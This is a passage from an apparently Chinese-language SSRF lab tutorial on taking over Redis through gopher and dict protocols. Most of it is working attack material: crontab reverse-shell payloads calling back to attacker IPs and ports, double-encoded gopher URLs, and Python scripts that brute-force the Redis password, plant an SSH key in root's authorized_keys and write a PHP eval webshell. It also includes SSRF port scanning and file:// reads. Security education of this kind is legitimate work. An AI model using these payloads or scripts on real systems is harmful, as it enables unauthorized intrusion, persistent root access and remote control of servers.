/>我们把80改为6379，结果如下<br />![Snipaste_2021-06-27_04-06-26.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738533076-d54ad861-f705-4311-a1c5-fe8d2223db71.png#align=left&display=inline&height=983&id=ucee94c98&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_04-06-26.png&originHeight=983&originWidth=1694&size=166813&status=done&style=none&width=1694)<br />此结果证明172.18.0.2的6379端口是开放的

这里可以使用burp来爆破端口<br />设置好变量<br />![Snipaste_2021-06-27_04-19-00.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738776904-dbc217c7-4bd7-44ed-be5a-c26c54c5b8ae.png#align=left&display=inline&height=983&id=ued6e0916&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_04-19-00.png&originHeight=983&originWidth=1694&size=115734&status=done&style=none&width=1694)<br />设置爆破1-10000端口<br />![Snipaste_2021-06-27_04-19-14.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738803443-d30bcf91-4005-46c0-a59e-6c7e4992222d.png#align=left&display=inline&height=983&id=u988823ae&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_04-19-14.png&originHeight=983&originWidth=1694&size=63569&status=done&style=none&width=1694)<br />以length排序后，可以立马发现6379端口<br />![Snipaste_2021-06-27_04-22-00.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624738999467-146d6913-6620-4a05-8f92-bae26ab2feb4.png#align=left&display=inline&height=778&id=u106c439c&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_04-22-00.png&originHeight=778&originWidth=1049&size=35121&status=done&style=none&width=1049)<br />也可以通过python脚本实现……

2. 反弹shell

首先在主机192.168.31.73（kali）启动nc监听
```bash
nc -lvnp 10000
```
![Snipaste_2021-06-27_05-02-32.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624741363484-ef01dc2f-82f4-48d2-bd44-53e320f4b920.png#align=left&display=inline&height=61&id=vYTVZ&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_05-02-32.png&originHeight=61&originWidth=389&size=3231&status=done&style=none&width=389)<br />然后这里我们使用如下反弹shell的脚本
```bash
test%0D%0A%0D%0A

set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.31.73/10000 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```
我们将其进行URL编码
```http
http://172.18.0.2:6379/
test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.73%2F10000%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```
其中172.18.0.2:6379是目标主机<br />通过burp构造发送包，点击send<br />![Snipaste_2021-06-27_05-08-28.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624741724489-e62348de-f886-4599-98b2-22b4a68dc15f.png#align=left&display=inline&height=983&id=u29f9a91d&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_05-08-28.png&originHeight=983&originWidth=1694&size=186418&status=done&style=none&width=1694)<br />回复包说明服务器已经收到了我们的请求<br />这时候我们再回到kali主机，发现已经得到了shell<br />![Snipaste_2021-06-27_05-10-08.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624741843784-99ed8c1d-5005-46d8-945e-b3933bcc6ed7.png#align=left&display=inline&height=241&id=u2af3d5c0&margin=%5Bobject%20Object%5D&name=Snipaste_2021-06-27_05-10-08.png&originHeight=241&originWidth=597&size=13175&status=done&style=none&width=597)
## SSRF漏洞渗透Redis
### Redis定义
REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。<br />Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。<br />它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 ----摘自[runoob](https://link.zhihu.com/?target=https%3A//www.runoob.com/redis/redis-tutorial.html)<br />redis是一种非关系型数据库，nosql
### Redis安装

1. 安装redis
```bash
apt-get install redis-server
```

2. 修改redis监听IP(如果不修改，不可远程登录)，IP需要替换为自己的IP
```bash
vim /etc/redis/redis.conf
# 修改为以下内容
bind 127.0.0.1 192.168.0.67
```

3. 启动redis服务
```bash
service redis-server start
```

### 0x01 Redis入侵，反弹shell
在开始讲攻击Redis之前，必须要理解Redis的客户端和服务端的通信方式，以及数据发送的格式，该目的的实现需要tcpdump的抓包功能。使用抓包软件来查看Redis客户端和Redis服务端的通信数据，找到语法结构后开始模拟客户端发送数据。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624805501488-ee361262-e46a-4c8d-9ced-1d417cc73770.png#align=left&display=inline&height=982&margin=%5Bobject%20Object%5D&name=image.png&originHeight=982&originWidth=2446&size=598905&status=done&style=none&width=2446)

1. 使用tcpdump来完成抓包，命令如下：
```bash
tcpdump -i eth0 port 6379 -w redis.pcap
参数说明如下：（更多tcpdump的教程，参考[Tcpdump教程](https://www.runoob.com/linux/linux-comm-tcpdump.html)）
-i：指定网卡为eth0
port：指定抓哪个端口的数据
-w：将流量包保存为文件
```

2. 使用Redis客户端登录Redis服务端，命令如下(默认无密码)：
```bash
root@Kali-2018:~/tmp# redis-cli -h 192.168.0.119 -p 6379
192.168.0.119:6379> get a
(nil)
192.168.0.119:6379>
```
以上命令做了一个获取a对应的值是多少的操作，现在我们使用wireshark看一下抓到的包(使用追踪流-TCP流)：
```
上面非常多的内容就不放了
*2
$3
get
$1
a
-1
```
如果不理解Redis的数据发送的数据包格式，是看不懂上面内容的，这里必须要讲这么几个内容：<br />**2.1、序列化协议**：客户端-服务端之间交互的是序列化后的协议数据。在Redis中，协议数据分为不同的类型，每种类型的数据均以CRLF（\r\n）结束，通过数据的首字符区分类型。<br />**2.2、inline command**：这类数据表示Redis命令，首字符为Redis命令的字符，格式为 str1 str2 str3 …。如：exists key1，命令和参数以空格分隔。<br />**2.3、simple string**：首字符为'+'，后续字符为string的内容，且该string 不能包含'\r'或者'\n'两个字符，最后以'\r\n'结束。如：'+OK\r\n'，表示”OK”，这个string数据。<br />**2.4、bulk string**：bulk string 首字符为'$'，紧跟着的是string数据的长度，'\r\n'后面是内容本身（包含’\r’、’\n’等特殊字符），最后以'\r\n'结束。如：
```
"$12\r\nhello\r\nworld\r\n"
```
上面字节串描述了 “hello\r\nworld” 的内容（中间有个换行）。对于" "空串和null，通过'$' 之后的数字进行区分：
```
"$0\r\n\r\n" 表示空串；
"$-1\r\n" 表示null。
```
**2.5、integer**：以 ':' 开头，后面跟着整型内容，最后以'\r\n'结尾。如：":13\r\n"，表示13的整数。<br />**2.6、array**：以'*'开头，紧跟着数组的长度，"\r\n" 之后是每个元素的序列化数据。如："*2\r\n+abc\r\n:9\r\n" 表示一个长度为2的数组：["abc", 9]。数组长度为0或 -1分别表示空数组或 null。<br />数组的元素本身也可以是数组，多级数组是树状结构，采用先序遍历的方式序列化。如：[[1, 2], ["abc"]]，序列化为："*2\r\n*2\r\n:1\r\n:2\r\n*1\r\n+abc\r\n"。

3. 经过上面内容的讲解，在回过头理解抓到的redis的包就很容易明白了。
```
上面非常多的内容就不放了
*2 数组长度为2
$3 bulk string，代表字符串长度为3，就是get
get 普通字符
$1 bulk string，代表字符串长度为1，就是a
a 普通字符
-1 返回内容，-1代表null
```
明白以上内容后基本就理清了思路，如果要给redis发命令，按照他的序列化规则即可。现在有一个大胆的想法，如果我用gopher去执行redis的命令呢？为了实现我们的想法，我们在Redis中加一个key，名字为name，值为Margin。命令如下：
```
set name Margin
```
此时，我们使用curl来发起gopher的请求，如下：
```bash
curl gopher://192.168.0.119:6379/_*2
$3
get
$4
name
```
将其转化为url编码
```bash
curl gopher://192.168.0.119:6379/_%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%6e%61%6d%65%0d%0a
```
执行结果如下
```bash
margine:~ margin$ curl gopher://192.168.0.119:6379/_%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%6e%61%6d%65%0d%0a
$6
Margin
```
那如果是在web漏洞中呢？如何利用？经过 **Gopher协议在SSRF漏洞中的深入研究** 的内容可以很容易的联想到使用方法：
```
1、构造利用代码
2、url转码
3、再次url转码
```
web环境我们还是使用上一节课的代码（curl_exec.php），代码如下：
```php
<?php
$url = $_GET['url'];
echo $url;
#var_dump(curl_version());
$curlobj = curl_init($url);
echo curl_exec($curlobj);
?>
```
最终构造利用代码为：
```http
http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3a%2f%2f192.168.0.119%3a6379%2f_%25%32%61%25%33%32%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%36%37%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%36%65%25%36%31%25%36%64%25%36%35%25%30%64%25%30%61
```
但使用curl请求后一直卡顿，没有任何回显，无比绝望，我的排查思路为下：
```
1、查看web日志，是否有错误日志（发现并没有）
2、在执行curl_exe函数前，加上exit()函数，这样我便能判断http请求是否到后台代码了（结果可以）
3、查看redis的命令执行记录（接下来讲这个）
```
在Linux命令行中执行以下命令来查看Redis命令执行记录：
```bash
redis-cli -h 127.0.0.1  monitor
```
执行结果为下图，说明redis接收到了来自gopher的请求，但没有命令回显，为什么？（需要在命令后面加QUIT，后面会用到）<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624806164809-e5e3edbd-af7d-4928-8738-e54027fc5320.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&name=image.png&originHeight=174&originWidth=2446&size=483602&status=done&style=none&width=2446)<br />虽然无法回显命令执行的结果，但是命令确实是执行了，接下来测试下反弹shell（没有用上面讲的redis的数据包格式，下面的格式也可以），命令如下：
```
set mars "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```
上述命令的含义总结为，利用Redis的备份功能，将crontab的定时任务备份到/etc/crontab中，起到执行命令的效果，因为Linux会监测/etc/crontab的内容，当我们将反弹shell的命令加入进去后，便会被执行，具体解释如下：
```
# 添加名为mars的key，值为后面反弹shell的语句,5个星号代表每分钟执行一次，开始和技术的\n必须要有一个，也就是前后各有一个，当然，多个可以，主要是为了避免crontab的语法错误。crontab知识可以参考：【https://www.runoob.com/w3cnote/linux-crontab-tasks.html】
set mars "\n\n\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\n\n\n\n"
# 设置备份的路径为/etc
config set dir /etc/
# 设置备份文件名为crontab
config set dbfilename crontab
# 开始备份
save
```
进行二次URL编码，结果如下：
```http
http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher%3a%2f%2f192.168.0.119%3a6379%2f_%25%30%64%25%30%61%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%32%30%25%36%64%25%36%31%25%37%32%25%37%33%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%32%30%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%32%30%25%33%65%25%32%36%25%32%30%25%32%66%25%36%34%25%36%35%25%37%36%25%32%66%25%37%34%25%36%33%25%37%30%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%30%25%32%65%25%33%31%25%33%31%25%33%39%25%32%66%25%33%39%25%33%39%25%33%39%25%33%39%25%32%30%25%33%30%25%33%65%25%32%36%25%33%31%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%33%25%37%32%25%36%66%25%36%65%25%37%34%25%36%31%25%36%32%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61
```
执行结果如下，1分钟后发现成功反弹shell。
```bash
margine:~ margin$ nc -l 9999
ls
bash: no job control in this shell
[root@7471cd804b12 ~]# ls
anaconda-ks.cfg
install.log
install.log.syslog
```
简易脚本如下：
```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2,urllib

url = "http://192.168.0.109/ssrf/base/curl_exec.php?url="
gopher = "gopher://192.168.0.119:6379/_"
# 攻击脚本，\n的\一定要转义
"set mars "\\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/6670  0>&1\\n"
config set dir /etc/
config set dbfilename crontab
save
"""

def encoder_url(data):
    encoder = ""
    for single_char in data:
        # 先转为ASCII
        encoder += str(hex(ord(single_char)))
    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")
    return encoder

# 二次编码
encoder = encoder_url(encoder_url(data))

# 生存payload
payload = url + urllib.quote(gopher,'utf-8') + encoder

# 发起请求
request = urllib2.Request(payload)
response = urllib2.urlopen(request).read()
```

### 0x02 Redis认证攻击
以上为Redis未授权访问攻击，但如果Redis设置了密码呢？<br />如果要执行命令的话，必须要有密码才可以，所以接下来的问题便是如何破解Redis的密码，首先想到的暴力破解。此时要研究下Redis如何验证身份信息。方法还是抓包，抓到认证的流量，重放即可。抓包发现：
```
*2
$4
auth
$6
Margin
```
可以翻译为认证命令为auth xxxx<br />那么我们将redis的密码改为任意密码，我设置为Margin
```
config set requirepass Margin
```
将请求包改为
```
auth Margin
quit
```
python代码变为
```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2,urllib

url = "http://192.168.0.109/ssrf/base/curl_exec.php?url="
gopher = "gopher://192.168.0.119:6379/_"

def get_password():
    f = open("password.txt","r")
    return f.readlines()

def encoder_url(data):
    encoder = ""
    for single_char in data:
        # 先转为ASCII
        encoder += str(hex(ord(single_char)))
    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")
    return encoder

mark = 0
for password in get_password():
    # 攻击脚本
    data = """auth %s
    quit
    """ % password
    # 二次编码
    encoder = encoder_url(encoder_url(data))
    # 生存payload
    payload = url + urllib.quote(gopher,'utf-8') + encoder

    # 发起请求
    request = urllib2.Request(payload)
    response = urllib2.urlopen(request).read()
    if response.count("+OK") > 1:
        print "find password : " + password
        mark = 1

if mark == 0 :print "not found"
```
所以，在已知密码的情况下可以将攻击的python代码中加入认证的语句，如下：
```
auth Margin
set mars "\\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/6671  0>&1\\n"
config set dir /etc/
config set dbfilename crontab
save
```
python代码如下
```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2,urllib

url = "http://192.168.0.109/ssrf/base/curl_exec.php?url="
gopher = "gopher://192.168.0.119:6379/_"

# 攻击脚本
data = """auth Margin
set mars "\\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/6671  0>&1\\n"
config set dir /etc/
config set dbfilename crontab
save
"""

def encoder_url(data):
    encoder = ""
    for single_char in data:
        # 先转为ASCII
        encoder += str(hex(ord(single_char)))
    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")
    return encoder

# 二次编码
encoder = encoder_url(encoder_url(data))

# 生存payload
payload = url + urllib.quote(gopher,'utf-8') + encoder

# 发起请求
request = urllib2.Request(payload)
response = urllib2.urlopen(request).read()
```
再次运行python脚本，便可成功反弹shell。

### 0x03 写ssh-keygen公钥，使用私钥登陆
在上面的内容中描述了如何使用Redis的数据备份执行命令，接下来讲解通过写入ssh-keygen公钥，使用私钥登录。思路还是利用备份，将私钥字符串备份到目标服务器.ssh目录下。<br />要完成此操作，需要两个前提条件

- Redis服务使用ROOT账号启动(可以临时执行sudo -u root /usr/bin/redis-server /etc/redis/redis.conf 来以root权限运行)
- 服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。

首先在本地生成一对密钥
```bash
ssh-keygen -t rsa
margine:.ssh margin$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/Users/margin/.ssh/id_rsa):  
/Users/margin/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /Users/margin/.ssh/id_rsa.
Your public key has been saved in /Users/margin/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:QKUmi/y9Tu27soIg2+rRrvDO16sQBnrSCzkVx4RcTSw margin@margine.local
The key's randomart image is:
+---[RSA 2048]----+
| ..=++o..        |
|  ooE.o.         |
|. . ..+          |
|.* . + .         |
|* B .   S        |
|o*.+ . .         |
|o=oo..o .        |
|oo=.o.oo         |
|o==o.+=++o       |
+----[SHA256]-----+
```
查看密钥的字符串，一会使用Redis的备份功能，将密钥字符串传到目标服务器。
```bash
margine:.ssh margin$ cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgDf+ah2WKGExLdwR/wb8959lZiiV+N0l55PxuwjkclpCAiZSXW8QSMmXPEyRazonnb63cLQHyOnB3u7IPRlqCcKIRnB3qX0GtgjPgDDQlda5pCY99tgtzPQ6qkaiOaxy6k6GQFdSYU5if2m4c/B1DlVSodw7F0sI+v8OG2iGy8UY2n+B049EKpgky45V96xhA9lIFi1tYJiLF7X6tx8l2Jf4OkC8y5am6P1lIG2vg2eraY6iXsCsE8D8Q2nYxdPT5ogKgdyjWULzbRMBjaPgxlgktv12cYjxqbIQhlUKGQxbBxIESf8sY+NMAODAwR4wBDl3thllYsHCzUf5c9yVR margin@margine.local
```
构造payload，如下：
```
config set dir /root/.ssh/
config set dbfilename authorized_keys
set margin "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgDf+ah2WKGExLdwR/wb8959lZiiV+N0l55PxuwjkclpCAiZSXW8QSMmXPEyRazonnb63cLQHyOnB3u7IPRlqCcKIRnB3qX0GtgjPgDDQlda5pCY99tgtzPQ6qkaiOaxy6k6GQFdSYU5if2m4c/B1DlVSodw7F0sI+v8OG2iGy8UY2n+B049EKpgky45V96xhA9lIFi1tYJiLF7X6tx8l2Jf4OkC8y5am6P1lIG2vg2eraY6iXsCsE8D8Q2nYxdPT5ogKgdyjWULzbRMBjaPgxlgktv12cYjxqbIQhlUKGQxbBxIESf8sY+NMAODAwR4wBDl3thllYsHCzUf5c9yVR margin@margine.local"
save
quit
```
进一步得到python代码为：
```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2,urllib

url = "http://192.168.0.109/ssrf/base/curl_exec.php?url="
gopher = "gopher://192.168.0.67:6379/_"

# 攻击脚本
data = """config set dir /root/.ssh/
config set dbfilename authorized_keys
set margin "\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdIj0d7vofujQU9H2eYIboU16EKy61mAalJXYP66sPINFEToBb7YeaROlpg6/B5u+lgcjOq2X+zxQwid4pSS2xj2kbornpeDXHh9boQqAzDdWgGBuRYi6scfiQ9hY0BN2rQ44gimQkKibM7MJR7XmqnUg/pgIgbepDRlYghj0DUW2iHE9a/z4aZXEZE1SN29OUyQmy/4OOIsCsmmjZBYJ/zmFaWG2aYbGRQDuc6iDITqN1T+CuNQ3PNZUb7GgZQ8FbJHgcFbOjNbfMBcP1SRoKKtA7YIx4eyFw0xUxKPwiAKDIWf3HqlfxTpGeoqMDyPumCioCNeDqeR5Wmy6q9OSn margin@margine.local\\n\\n"
save
quit

"""

def encoder_url(data):
    encoder = ""
    for single_char in data:
        # 先转为ASCII
        encoder += str(hex(ord(single_char)))
    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")
    return encoder

# 二次编码
encoder = encoder_url(encoder_url(data))

print encoder
# 生存payload
payload = url + urllib.quote(gopher,'utf-8') + encoder

# 发起请求
request = urllib2.Request(payload)
response = urllib2.urlopen(request).read()
print response
```

### 0x04 写webshell
经过上面文章的学习，对于写webshell来说便变得非常简单，要完成此操作，需要两个前提条件

- 当前运行redis的用户在web目录有写权限
- 知道web目录的绝对路径

步骤比较简单，原理还是利用Redis的备份功能，只不过这次是备份成webshell（redis所在的服务器需要phpstudy环境）<br />修改python中的payload，如下：
```
"config set dir /var/www/html/
config set dbfilename margin.php
set margin "\\n<?php eval($_POST['margin']);?>\\n"
save
quit

"""
```
python代码如下
```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2,urllib

url = "http://192.168.0.109/ssrf/base/curl_exec.php?url="
gopher = "gopher://192.168.0.67:6379/_"

# 攻击脚本
data = """config set dir /var/www/html/
config set dbfilename margin.php
set margin "\\n<?php eval($_POST['margin']);?>\\n"
save
quit

"""

def encoder_url(data):
    encoder = ""
    for single_char in data:
        # 先转为ASCII
        encoder += str(hex(ord(single_char)))
    encoder = encoder.replace("0x","%").replace("%a","%0d%0a")
    return encoder

# 二次编码
encoder = encoder_url(encoder_url(data))

print encoder
# 生存payload
payload = url + urllib.quote(gopher,'utf-8') + encoder

# 发起请求
request = urllib2.Request(payload)
response = urllib2.urlopen(request).read()
print response
```
执行后可以看到目标主机有了margin.php文件，使用菜刀连接即可。
## SSRF漏洞中使用到的其他协议
### 0x01 dict协议
**定义**：词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。（摘自百度百科）<br />**DICT协议在SSRF漏洞中使用**<br />在SSRF利用中，gopher协议无疑是最好用的，但gopher协议的使用是有一定条件的，如下：<br />![](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624868913528-040da6d1-7a06-4835-b300-6a197ba3824b.png#align=left&display=inline&height=173&margin=%5Bobject%20Object%5D&originHeight=173&originWidth=1440&size=0&status=done&style=none&width=1314)

当gopher协议无法使用时，怎么办？这时候可以使用dict协议，我们先看执行效果：<br />![](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624868913549-a916b208-9986-4095-ac28-033a0fb8671f.png#align=left&display=inline&height=140&margin=%5Bobject%20Object%5D&originHeight=140&originWidth=1330&size=0&status=done&style=none&width=1330)<br />由上图可以发现通过dict协议，可以看出目标端口的指纹信息，通过上图返回的指纹信息，可以明确，是6379的redis数据库。OK，现在我们知道，利用dict协议可以探测端口的开放情况和指纹信息，那么dict协议怎么进一步使用？有什么语法？以下为dict协议的使用：

1. dict://serverip:port/命令:参数
1. 向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利
1. 通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。

明白利用方法后，我们可以使用dict协议执行命令，例如可以获取redis的变量
```bash
margine:~ margin$ curl dict://192.168.0.67:6379/get:name
-ERR Syntax error, try CLIENT (LIST | KILL ip:port | GETNAME | SETNAME connection-name)
$6
Margin
+OK
```
通过dict协议利用redis的未授权访问反弹shell的步骤如下：
```bash
# 1、开启反弹shell的监听
nc -l 9999
# 2、依次执行下面的命令
curl dict://192.168.0.119:6379/set:mars:"\n\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\n\n"
curl dict://192.168.0.119:6379/config:set:dir:/etc/
curl dict://192.168.0.119:6379/config:set:dbfilename:crontab
curl dict://192.168.0.119:6379/bgsave
```
执行时，反弹shell的命令，也就是set:mars:xxx，会因为特殊字符的原因无法写入到目标的redis中，被被空格所分割导致出现一下情况：
```
1584705879.520734 [0 172.17.0.1:44488] "set" "mars" "\\n\\n*" "*" "*" "*" "*" "root" "bash" "-i" ">&" "/dev/tcp/192.168.0.119/6789" "0>&1\\n\\n"
```
根据上图我们会发现，命令被分割了，看表象感觉像是被空格分割了。此时将反弹shell的命令进行十六进制转换，变为：
```bash
curl dict://192.168.0.119:6379/set:mars:\"\\x0a\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x72\\x6f\\x6f\\x74\\x20\\x62\\x61\\x73\\x68\\x20\\x2d\\x69\\x20\\x3e\\x26\\x20\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x30\\x2e\\x31\\x31\\x39\\x2f\\x39\\x39\\x39\\x39\\x20\\x30\\x3e\\x26\\x31\\x0a\"
```
以上单引号使用反斜杠\进行转移，其他数据进行十六进制编码，执行结果如下，可以发现没有错误了
```
1584706087.980465 [0 172.17.0.1:44490] "set" "mars" "\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\n"
```
剩下的修改路径和文件名称的请求，正常执行即可，脚本如下：
```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2,urllib,binascii
url = "http://192.168.0.109/ssrf/base/curl_exec.php?url="
target = "dict://192.168.0.119:6379/"
cmds = ['set:mars:\\\\"\\n* * * * * root bash -i >& /dev/tcp/192.168.0.119/9999 0>&1\\n\\\\"',
       "config:set:dir:/etc/",
       "config:set:dbfilename:crontab",
       "bgsave"]

for cmd in cmds:
    cmd_encoder = ""
    for single_char in cmd:
        # 先转为ASCII
        cmd_encoder += hex(ord(single_char)).replace("0x","")
    cmd_encoder = binascii.a2b_hex(cmd_encoder)
    cmd_encoder = urllib.quote(cmd_encoder,'utf-8')

    payload = url + target + cmd_encoder
    print payload
    request = urllib2.Request(payload)
    response = urllib2.urlopen(request).read()
```
但很多时候我们利用ssrf漏洞去攻击内网服务器的时候，并不知道内网中有什么样的应用、IP地址是多少、开放了什么端口、端口对应的服务是什么。所以需要先对内网做IP+端口的扫描，如果开放的服务是redis才能使用上文讲到的利用方法，对于不同的应用有不同的扫描方法，例如，redis的扫描可以请求以下内容来根据回显内容进行判断是否为redis，其他的服务也是同样道理，只要知道服务的指纹，然后与自己的指纹库进行比对即可：
```bash
curl dict://192.168.0.119:6379/
```
### 0x02 file协议
file协议主要用于访问本地计算机中的文件，命令格式为：
```
file://文件路径
```
使用file协议可以直接读取目标操作系统的文件，例如使用以下方法来读取<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624869371771-7e72f093-a07b-4640-aab1-a63680e8883c.png#align=left&display=inline&height=194&margin=%5Bobject%20Object%5D&name=image.png&originHeight=194&originWidth=1850&size=269518&status=done&style=none&width=1850)<br />file协议和http协议有什么区别呢？

- file协议主要用于读取服务器本地文件，访问的是本地的静态资源
- http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析
- http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以
- file对应的类似http的协议是ftp协议（文件传输协议）
- file不能跨域
